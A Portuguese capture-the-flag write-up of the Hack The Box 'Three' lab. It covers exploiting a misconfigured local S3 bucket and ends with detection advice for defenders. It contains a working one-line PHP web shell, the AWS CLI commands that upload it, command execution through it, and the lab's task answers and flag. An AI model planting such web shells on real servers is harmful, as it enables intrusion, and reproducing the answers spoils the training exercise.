# Three — HTB

> Dificuldade: Very Easy | Plataforma: Hack The Box | SO: Linux
> Temas: enumeração de subdomínio, AWS S3 mal configurado, web shell PHP, RCE
> Data: 22/09/2026 | Duração do lab: 01:13:11

## Ferramentas utilizadas

- Nmap — reconhecimento de portas e serviços
- AWS CLI — interação com o serviço S3 do alvo
- Web shell PHP — execução remota de comandos

## Resumo

Three expõe um site estático e um subdomínio rodando um serviço Amazon S3
local. O S3 está mal configurado: aceita credenciais sem validá-las e
permite escrita não autenticada no bucket que serve o site. Como o servidor
executa PHP, subir uma web shell ao bucket resulta em execução remota de
comandos, e a partir daí a leitura da flag é direta.

## Reconhecimento

Comecei com um Nmap simples sobre o IP. Para uma leitura inicial não há
necessidade de um comando mais complexo — o objetivo é só mapear o que o
alvo expõe antes de formar qualquer hipótese.

nmap 10.129.225.166


O resultado mostrou duas portas TCP abertas:

- 22/tcp — SSH
- 80/tcp — HTTP

> **Task 1 — How many TCP ports are open?**
> R: 2

Com uma porta web aberta, o próximo passo natural é acessar o site. Antes
disso, uma observação de método: como o alvo usa nomes de domínio internos
(`.htb`), o navegador não consegue resolvê-los sozinho — nenhum servidor DNS
público conhece esses nomes. A tradução de nome para IP precisa ser feita
manualmente no arquivo `/etc/hosts`, que o sistema consulta antes de recorrer
ao DNS.

> **Task 3 — In the absence of a DNS server, which Linux file can we use to
> resolve hostnames to IP addresses?**
> R: /etc/hosts

Adicionei o subdomínio fornecido pelo box ao `/etc/hosts`, apontando para o
IP do alvo:

10.129.225.166 s3.thetoppers.htb


Ao acessar `http://s3.thetoppers.htb`, a página retornou apenas
`{"status": "running"}` — resposta característica de um serviço de
infraestrutura respondendo que está no ar, não de um site com conteúdo.

## Enumeração

O objetivo desta fase (Task 2) era encontrar um endereço de e-mail na seção
"Contact" do site. O subdomínio `s3.` não tinha esse conteúdo, então a
hipótese natural foi que o site principal — sem o prefixo `s3.` — estaria em
outro lugar.

Pesquisei o que significa "s3" e confirmei que é o Amazon S3, um serviço de
armazenamento em nuvem. Isso reorientou o raciocínio: `s3.thetoppers.htb` é
o *serviço de armazenamento*, e o site da banda deveria estar no domínio raiz.
Editei o `/etc/hosts` novamente para incluir o domínio principal:

10.129.225.166 s3.thetoppers.htb
10.129.225.166 thetoppers.htb


Neste ponto travei: o site não abria, retornando "Destination Host
Unreachable". Investigando em camadas — primeiro confirmando que o alvo
respondia — descobri que o IP do box havia mudado desde o início da sessão
(a instância do HTB é reiniciada e recebe novo IP). O `/etc/hosts` ainda
apontava para o IP antigo. Corrigi as duas linhas para o IP atual e o acesso
voltou. Foi um lembrete prático de confirmar a base do ambiente antes de
suspeitar de problemas mais complexos: um IP defasado teria me feito debugar
o site inteiro procurando um erro que não existia ali.

Com o site principal acessível, localizei o e-mail na seção de contato.

> **Task 2 — What is the domain of the email address in the "Contact"
> section?**
> R: thetoppers.htb

Sobre a descoberta do subdomínio: à primeira vista pode parecer que o
caminho seria rodar um gobuster em modo `vhost` para enumerar subdomínios,
mas o `s3.thetoppers.htb` já havia sido fornecido pelo próprio box no início.
Reconhecer que a informação já estava dada evitou uma etapa de força bruta
desnecessária.

> **Task 4 — Which sub-domain is discovered during further enumeration?**
> R: s3.thetoppers.htb

> **Task 5 — Which service is running on the discovered sub-domain?**
> R: Amazon S3

## Exploração

Cada serviço tem uma interface natural de interação. Para um site é o
navegador; para um S3 é a ferramenta de linha de comando da AWS, o **AWS
CLI**. Pesquisei e confirmei que é essa a utilidade usada para conversar com
o serviço.

> **Task 6 — Which command line utility can be used to interact with the
> service?**
> R: AWS CLI

O AWS CLI precisa ser configurado antes do uso, com o comando `aws configure`.

> **Task 7 — Which command is used to set up the AWS CLI installation?**
> R: aws configure

Ao rodar `aws configure`, a ferramenta pede Access Key, Secret Key, região e
formato de saída. Aqui está a vulnerabilidade central do box: como este é um
S3 local (um simulador, não a AWS real), ele não valida as credenciais.
Preenchi as chaves com valores fajutos (`test`/`test`), região `us-east-1`,
e a ferramenta aceitou sem contestar. Um S3 real rejeitaria credenciais
inválidas de imediato — é a má configuração que abre a porta.

Com o AWS CLI configurado, o comando para listar os buckets é `aws s3 ls`.

> **Task 8 — What is the command used to list all of the S3 buckets?**
> R: aws s3 ls

Para listar o conteúdo do bucket do site, o comando cresce com o nome do
bucket e a flag `--endpoint-url`, que aponta a ferramenta para o alvo local
em vez dos servidores reais da Amazon:

aws s3 ls s3://thetoppers.htb --endpoint-url=http://s3.thetoppers.htb


O resultado revelou os arquivos do site dentro do bucket:

PRE images/
.htaccess
index.php


A extensão `.php` do arquivo principal responde diretamente qual linguagem o
servidor executa — descoberta direto da fonte, sem depender de headers HTTP
(que, neste alvo, não vazavam a tecnologia).

> **Task 9 — This server is configured to run files written in what web
> scripting language?**
> R: PHP

Com acesso de escrita ao bucket, a peça final se encaixa. O bucket S3 não é
um armazenamento isolado: ele serve os próprios arquivos do site (o
`index.php` e a pasta `images/` que apareceram na listagem). Escrever no
bucket é, na prática, escrever no diretório que o Apache serve — o
`/var/www/html` do servidor. Somando isso ao fato de que o servidor executa
PHP, o caminho para execução remota fica claro: se eu subir um arquivo PHP ao
bucket, o Apache vai executá-lo quando ele for acessado pelo navegador.

O arquivo que serve a esse propósito é uma **web shell** — um script mínimo
cuja única função é receber um comando e executá-lo no sistema operacional do
servidor. A versão mais enxuta em PHP cabe em uma linha:

```php
<?php system($_GET['cmd']); ?>
```

Ela lê o parâmetro `cmd` da URL (`$_GET['cmd']`) e o executa no sistema via
`system()`, devolvendo a saída na própria página.

Criei o arquivo e o subi para o bucket:

echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws s3 cp shell.php s3://thetoppers.htb/shell.php --endpoint-url=http://s3.thetoppers.htb


Antes de partir para a flag, fiz um teste de vida: acessei a shell com um
comando inofensivo para confirmar que ela executava de fato.

http://thetoppers.htb/shell.php?cmd=id


O retorno confirmou execução remota de comandos:

uid=33(www-data) gid=33(www-data) groups=33(www-data)


## Comprometimento

Com a web shell funcional rodando como `www-data`, localizei a flag no
diretório indicado pela task:

http://thetoppers.htb/shell.php?cmd=ls /var/www/


Retorno: `flag.txt html`

E li o conteúdo com `cat`, usando o caminho completo:

http://thetoppers.htb/shell.php?cmd=cat /var/www/flag.txt


> **Submit the flag located in /var/www/.**
> R: a980d99281a28d638ac68b9bf9453c2b

## Perspectiva Blue Team

Cada etapa desta cadeia deixa rastro detectável, e vale percorrê-las do
ponto de vista de quem defende.

**Acesso anônimo ao bucket S3.** A raiz do comprometimento é uma má
configuração: o serviço aceita credenciais sem validá-las e permite listagem
e escrita não autenticadas. Do lado defensivo, isso é um achado de postura,
não de tempo real — o tipo de problema que uma auditoria de configuração
(revisão de políticas de bucket, verificação de acesso público) detecta antes
de qualquer ataque acontecer. A detecção mais barata aqui é preventiva.

**Escrita de arquivo no bucket.** O upload da web shell é a ação mais crítica
e a mais detectável. Um arquivo novo aparecendo no diretório servido pela
aplicação — especialmente um `.php` que não faz parte do código legítimo — é
um sinal de alto valor. Monitoramento de integridade de arquivos (FIM),
vigiando criação e modificação em diretórios como `/var/www/html`, alertaria
sobre isso na hora. É exatamente o tipo de evento que o Wazuh captura com o
módulo de FIM configurado sobre o web root.

**Execução da web shell.** Cada requisição à shell gera log no Apache, e o
padrão é anômalo: um arquivo `.php` desconhecido acessado com um parâmetro
`cmd` na query string, seguido de respostas contendo saída de comandos do
sistema. Regras sobre logs de acesso web — procurando parâmetros suspeitos
como `cmd=` ou nomes de arquivo fora do inventário conhecido — sinalizariam
a atividade.

**Comandos rodando como www-data.** A execução de `id`, `ls` e `cat` a partir
do processo do servidor web foge do comportamento normal — um servidor web
legítimo raramente lê arquivos arbitrários do sistema. Telemetria de criação
de processo no host (auditd no Linux, ou o equivalente ao Sysmon no mundo
Windows) revelaria o processo do Apache gerando shells de sistema, uma
assinatura clássica de web shell em ação.

**Nota sobre a origem.** Este servidor não vazava a linguagem nos headers
HTTP, uma configuração mais cuidadosa que a de outros alvos. Mas isso não
impediu o comprometimento, porque a falha real estava na camada de
armazenamento, não na exposição de tecnologia. Reduzir superfície de
informação ajuda, mas não substitui corrigir a má configuração de fundo.

## Lições Aprendidas

- O comprometimento não veio de uma única falha explosiva, mas de uma cadeia:
  serviço exposto, credenciais não validadas, escrita permitida e execução de
  código no mesmo diretório. Cada elo sozinho parecia pequeno; juntos, deram
  controle da máquina.
- Um serviço de armazenamento que também serve os arquivos executáveis da
  aplicação é uma combinação perigosa. Escrita no armazenamento vira execução
  no servidor.
- Confirmar o estado do ambiente antes de investigar — o IP do alvo havia
  mudado, e assumir o IP antigo teria desperdiçado tempo debugando o lugar
  errado.
- Nem todo servidor vaza sua tecnologia nos headers. Quando os headers não
  entregam, a extensão dos arquivos servidos é uma fonte alternativa e
  confiável.

## Referências

- [MITRE ATT&CK — T1505.003: Web Shell](https://attack.mitre.org/techniques/T1505/003/)
- [OWASP — Top 10 A05:2021 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [AWS CLI — S3 command reference](https://docs.aws.amazon.com/cli/latest/reference/s3/)
